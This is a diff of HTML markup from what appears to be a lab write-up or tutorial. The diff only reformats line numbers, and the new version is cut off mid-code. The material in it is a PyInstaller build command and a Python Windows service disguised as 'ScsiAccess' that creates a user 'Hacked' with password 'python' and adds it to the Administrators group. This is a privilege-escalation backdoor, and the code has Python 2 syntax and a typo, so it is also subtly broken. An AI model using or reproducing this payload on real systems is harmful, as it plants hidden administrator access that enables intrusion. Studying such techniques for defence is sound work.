-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Pyinstaller<span class="w"> </span>--onfile<span class="w"> </span>Create_New_Admin_account.py
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>Pyinstaller<span class="w"> </span>--onfile<span class="w"> </span>Create_New_Admin_account.py
+</span></code></pre></div></td></tr></table></div>
 <p><strong>8.</strong> Script for Windows 10:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># The order of importing libraries matter. &quot;servicemanager&quot; should be imported after win32X. As following:-</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span> <span class="nn">win32serviceutil</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kn">import</span> <span class="nn">win32service</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="kn">import</span> <span class="nn">win32api</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kn">import</span> <span class="nn">win32timezone</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="kn">import</span> <span class="nn">win32net</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="kn">import</span> <span class="nn">win32netcon</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="kn">import</span> <span class="nn">servicemanager</span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="c1">## the rest of the code is still the same</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="kn">import</span> <span class="nn">os</span>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="kn">import</span> <span class="nn">ctypes</span>
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="k">class</span> <span class="nc">Service</span><span class="p">(</span><span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="p">):</span>
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>    <span class="n">_svc_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>    <span class="n">_svc_display_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>        <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="k">def</span> <span class="nf">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>        <span class="n">win32api</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">sec</span><span class="o">*</span><span class="mi">1000</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>    <span class="k">def</span> <span class="nf">SvcDoRun</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">)</span>
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>        <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_RUNNING</span><span class="p">)</span>
-</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>
-</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>        <span class="k">except</span><span class="p">:</span>
-</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">SvcStop</span><span class="p">()</span>
-</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>    <span class="k">def</span> <span class="nf">SvcStop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">)</span>
-</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
-</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOPPEED</span><span class="p">)</span>
-</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>
-</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">True</span>
-</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>
-</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>        <span class="n">USER</span> <span class="o">=</span> <span class="s2">&quot;Hacked&quot;</span>
-</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>        <span class="n">GROUP</span> <span class="o">=</span> <span class="s2">&quot;Administrators&quot;</span>
-</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>        <span class="n">user_info</span> <span class="o">=</span> <span class="nb">dict</span> <span class="p">(</span>
-</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>            <span class="n">name</span> <span class="o">=</span> <span class="n">USER</span><span class="p">,</span>
-</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>            <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;python&quot;</span><span class="p">,</span>
-</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>            <span class="n">priv</span> <span class="o">=</span> <span class="n">win32netcon</span><span class="o">.</span><span class="n">USER_PRIV_USER</span><span class="p">,</span>
-</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>            <span class="n">home_dir</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
-</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>            <span class="n">comment</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
-</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>            <span class="n">flags</span> <span class="o">=</span> <span class="n">win32netcon</span><span class="o">.</span><span class="n">UF_SCRIPT</span><span class="p">,</span>
-</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>            <span class="n">script_path</span> <span class="o">=</span> <span class="kc">None</span>
-</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>             <span class="p">)</span>
-</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>        <span class="n">user_group_info</span> <span class="o">=</span> <span class="nb">dict</span> <span class="p">(</span>
-</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a>            <span class="n">domainandname</span> <span class="o">=</span> <span class="n">USER</span>
-</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a>            <span class="p">)</span>
-</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a>        <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a>            <span class="n">win32net</span><span class="o">.</span><span class="n">NetUserAdd</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">user_info</span><span class="p">)</span>
-</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a>            <span class="n">win32net</span><span class="o">.</span><span class="n">NetLocalGroupAddMembers</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">GROUP</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="p">[</span><span class="n">user_group_info</span><span class="p">])</span>
-</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
-</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a>            <span class="k">pass</span>
-</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61" href="#__codelineno-4-61"></a><span class="w">        </span><span class="sd">&#39;&#39;&#39; </span>
-</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62" href="#__codelineno-4-62"></a><span class="sd">        f = open(&#39;C:/Users/nonadmin/Desktop/priv.txt&#39;, &#39;w&#39;)</span>
-</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63" href="#__codelineno-4-63"></a><span class="sd">        if ctypes.windll.shell32.IsUserAnAdmin() == 0:</span>
-</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64" href="#__codelineno-4-64"></a><span class="sd">            f.write(&#39;[-] We are NOT admin&#39;)</span>
-</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65" href="#__codelineno-4-65"></a><span class="sd">        else:</span>
-</span><span id="__span-4-66"><a id="__codelineno-4-66" name="__codelineno-4-66" href="#__codelineno-4-66"></a><span class="sd">            f.write(&#39;[+] We are admin&#39;)</span>
-</span><span id="__span-4-67"><a id="__codelineno-4-67" name="__codelineno-4-67" href="#__codelineno-4-67"></a><span class="sd">        f.close()</span>
-</span><span id="__span-4-68"><a id="__codelineno-4-68" name="__codelineno-4-68" href="#__codelineno-4-68"></a><span class="sd">        &#39;&#39;&#39;</span>
-</span><span id="__span-4-69"><a id="__codelineno-4-69" name="__codelineno-4-69" href="#__codelineno-4-69"></a>    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-4-70"><a id="__codelineno-4-70" name="__codelineno-4-70" href="#__codelineno-4-70"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">False</span>
-</span><span id="__span-4-71"><a id="__codelineno-4-71" name="__codelineno-4-71" href="#__codelineno-4-71"></a>
-</span><span id="__span-4-72"><a id="__codelineno-4-72" name="__codelineno-4-72" href="#__codelineno-4-72"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-</span><span id="__span-4-73"><a id="__codelineno-4-73" name="__codelineno-4-73" href="#__codelineno-4-73"></a>
-</span><span id="__span-4-74"><a id="__codelineno-4-74" name="__codelineno-4-74" href="#__codelineno-4-74"></a>
-</span><span id="__span-4-75"><a id="__codelineno-4-75" name="__codelineno-4-75" href="#__codelineno-4-75"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">Initialize</span><span class="p">()</span>
-</span><span id="__span-4-76"><a id="__codelineno-4-76" name="__codelineno-4-76" href="#__codelineno-4-76"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">PrepareToHostSingle</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
-</span><span id="__span-4-77"><a id="__codelineno-4-77" name="__codelineno-4-77" href="#__codelineno-4-77"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">StartServiceCtrlDispatcher</span><span class="p">()</span>
-</span><span id="__span-4-78"><a id="__codelineno-4-78" name="__codelineno-4-78" href="#__codelineno-4-78"></a>    <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">HandleCommandLine</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span>
+<span class="normal"><a href="#__codelineno-4-18">18</a></span>
+<span class="normal"><a href="#__codelineno-4-19">19</a></span>
+<span class="normal"><a href="#__codelineno-4-20">20</a></span>
+<span class="normal"><a href="#__codelineno-4-21">21</a></span>
+<span class="normal"><a href="#__codelineno-4-22">22</a></span>
+<span class="normal"><a href="#__codelineno-4-23">23</a></span>
+<span class="normal"><a href="#__codelineno-4-24">24</a></span>
+<span class="normal"><a href="#__codelineno-4-25">25</a></span>
+<span class="normal"><a href="#__codelineno-4-26">26</a></span>
+<span class="normal"><a href="#__codelineno-4-27">27</a></span>
+<span class="normal"><a href="#__codelineno-4-28">28</a></span>
+<span class="normal"><a href="#__codelineno-4-29">29</a></span>
+<span class="normal"><a href="#__codelineno-4-30">30</a></span>
+<span class="normal"><a href="#__codelineno-4-31">31</a></span>
+<span class="normal"><a href="#__codelineno-4-32">32</a></span>
+<span class="normal"><a href="#__codelineno-4-33">33</a></span>
+<span class="normal"><a href="#__codelineno-4-34">34</a></span>
+<span class="normal"><a href="#__codelineno-4-35">35</a></span>
+<span class="normal"><a href="#__codelineno-4-36">36</a></span>
+<span class="normal"><a href="#__codelineno-4-37">37</a></span>
+<span class="normal"><a href="#__codelineno-4-38">38</a></span>
+<span class="normal"><a href="#__codelineno-4-39">39</a></span>
+<span class="normal"><a href="#__codelineno-4-40">40</a></span>
+<span class="normal"><a href="#__codelineno-4-41">41</a></span>
+<span class="normal"><a href="#__codelineno-4-42">42</a></span>
+<span class="normal"><a href="#__codelineno-4-43">43</a></span>
+<span class="normal"><a href="#__codelineno-4-44">44</a></span>
+<span class="normal"><a href="#__codelineno-4-45">45</a></span>
+<span class="normal"><a href="#__codelineno-4-46">46</a></span>
+<span class="normal"><a href="#__codelineno-4-47">47</a></span>
+<span class="normal"><a href="#__codelineno-4-48">48</a></span>
+<span class="normal"><a href="#__codelineno-4-49">49</a></span>
+<span class="normal"><a href="#__codelineno-4-50">50</a></span>
+<span class="normal"><a href="#__codelineno-4-51">51</a></span>
+<span class="normal"><a href="#__codelineno-4-52">52</a></span>
+<span class="normal"><a href="#__codelineno-4-53">53</a></span>
+<span class="normal"><a href="#__codelineno-4-54">54</a></span>
+<span class="normal"><a href="#__codelineno-4-55">55</a></span>
+<span class="normal"><a href="#__codelineno-4-56">56</a></span>
+<span class="normal"><a href="#__codelineno-4-57">57</a></span>
+<span class="normal"><a href="#__codelineno-4-58">58</a></span>
+<span class="normal"><a href="#__codelineno-4-59">59</a></span>
+<span class="normal"><a href="#__codelineno-4-60">60</a></span>
+<span class="normal"><a href="#__codelineno-4-61">61</a></span>
+<span class="normal"><a href="#__codelineno-4-62">62</a></span>
+<span class="normal"><a href="#__codelineno-4-63">63</a></span>
+<span class="normal"><a href="#__codelineno-4-64">64</a></span>
+<span class="normal"><a href="#__codelineno-4-65">65</a></span>
+<span class="normal"><a href="#__codelineno-4-66">66</a></span>
+<span class="normal"><a href="#__codelineno-4-67">67</a></span>
+<span class="normal"><a href="#__codelineno-4-68">68</a></span>
+<span class="normal"><a href="#__codelineno-4-69">69</a></span>
+<span class="normal"><a href="#__codelineno-4-70">70</a></span>
+<span class="normal"><a href="#__codelineno-4-71">71</a></span>
+<span class="normal"><a href="#__codelineno-4-72">72</a></span>
+<span class="normal"><a href="#__codelineno-4-73">73</a></span>
+<span class="normal"><a href="#__codelineno-4-74">74</a></span>
+<span class="normal"><a href="#__codelineno-4-75">75</a></span>
+<span class="normal"><a href="#__codelineno-4-76">76</a></span>
+<span class="normal"><a href="#__codelineno-4-77">77</a></span>
+<span class="normal"><a href="#__codelineno-4-78">78</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1"># The order of importing libraries matter. &quot;servicemanager&quot; should be imported after win32X. As following:-</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="kn">import</span> <span class="nn">win32serviceutil</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="kn">import</span> <span class="nn">win32service</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="kn">import</span> <span class="nn">win32api</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="kn">import</span> <span class="nn">win32timezone</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="kn">import</span> <span class="nn">win32net</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="kn">import</span> <span class="nn">win32netcon</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="kn">import</span> <span class="nn">servicemanager</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="c1">## the rest of the code is still the same</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="kn">import</span> <span class="nn">os</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="kn">import</span> <span class="nn">ctypes</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="k">class</span> <span class="nc">Service</span><span class="p">(</span><span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="p">):</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>    <span class="n">_svc_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>    <span class="n">_svc_display_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>        <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>    <span class="k">def</span> <span class="nf">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>        <span class="n">win32api</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">sec</span><span class="o">*</span><span class="mi">1000</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a>    <span class="k">def</span> <span class="nf">SvcDoRun</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">)</span>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_RUNNING</span><span class="p">)</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a>        <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">SvcStop</span><span class="p">()</span>
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a>    <span class="k">def</span> <span class="nf">SvcStop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">)</span>
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOPPEED</span><span class="p">)</span>
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a>
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">True</span>
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a>
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a>        <span class="n">USER</span> <span class="o">=</span> <span class="s2">&quot;Hacked&quot;</span>
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a>        <span class="n">GROUP</span> <span class="o">=</span> <span class="s2">&quot;Administrators&quot;</span>
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a>        <span class="n">user_info</span> <span class="o">=</span> <span class="nb">dict</span> <span class="p">(</span>
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a>            <span class="n">name</span> <span class="o">=</span> <span class="n">USER</span><span class="p">,</span>
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46"></a>            <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;python&quot;</span><span class="p">,</span>
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47"></a>            <span class="n">priv</span> <span class="o">=</span> <span class="n">win32netcon</span><span class="o">.</span><span class="n">USER_PRIV_USER</span><span class="p">,</span>
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48"></a>            <span class="n">home_dir</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
+</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49"></a>            <span class="n">comment</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
+</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50"></a>            <span class="n">flags</span> <span class="o">=</span> <span class="n">win32netcon</span><span class="o">.</span><span class="n">UF_SCRIPT</span><span class="p">,</span>
+</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51"></a>            <span class="n">script_path</span> <span class="o">=</span> <span class="kc">None</span>
+</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52"></a>             <span class="p">)</span>
+</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53"></a>        <span class="n">user_group_info</span> <span class="o">=</span> <span class="nb">dict</span> <span class="p">(</span>
+</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54"></a>            <span class="n">domainandname</span> <span class="o">=</span> <span class="n">USER</span>
